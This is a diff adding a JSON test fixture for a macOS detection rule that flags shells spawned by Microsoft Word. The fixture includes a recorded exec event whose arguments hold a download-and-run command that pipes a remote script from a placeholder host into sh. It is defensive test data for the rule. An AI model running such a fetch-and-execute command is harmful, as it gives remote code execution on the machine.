@@ -1,0 +1,17 @@
+{
+  "events": [
+    {"event_id": "sfo-word-fork", "host_id": "fixture-host", "timestamp_ns": 1000, "event_type": "fork",
+     "payload": {"child_pid": 4500, "parent_pid": 1}},
+    {"event_id": "sfo-word-exec", "host_id": "fixture-host", "timestamp_ns": 1100, "event_type": "exec",
+     "payload": {"pid": 4500, "ppid": 1, "path": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
+                 "args": ["Microsoft Word"], "uid": 501, "gid": 20}},
+    {"event_id": "sfo-shell-fork", "host_id": "fixture-host", "timestamp_ns": 1200, "event_type": "fork",
+     "payload": {"child_pid": 4501, "parent_pid": 4500}},
+    {"event_id": "sfo-shell-exec", "host_id": "fixture-host", "timestamp_ns": 1300, "event_type": "exec",
+     "payload": {"pid": 4501, "ppid": 4500, "path": "/bin/bash",
+                 "args": ["bash", "-c", "curl -s https://example.invalid/s2 | sh"], "uid": 501, "gid": 20}}
+  ],
+  "expected_findings": [
+    {"rule_id": "shell_from_office", "severity": "high", "event_ids": ["sfo-shell-exec"]}
+  ]
+}
